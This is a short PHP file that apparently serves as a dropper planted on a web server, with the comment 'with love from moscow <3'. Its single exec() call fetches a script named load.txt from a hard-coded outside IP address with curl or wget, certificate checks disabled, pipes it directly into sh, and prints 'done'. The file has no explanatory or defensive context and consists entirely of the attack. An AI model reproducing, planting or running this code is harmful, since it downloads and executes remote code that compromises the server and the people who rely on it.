<?php
//with love from moscow <3
exec('if curl 127.0.0.1 -o /dev/null 2>/dev/null; then curl -k -o - http://176.111.173.206/load.txt|sh; else wget --no-check-certificate -O - http://176.111.173.206/load.txt|sh; fi');
echo 'done';
?>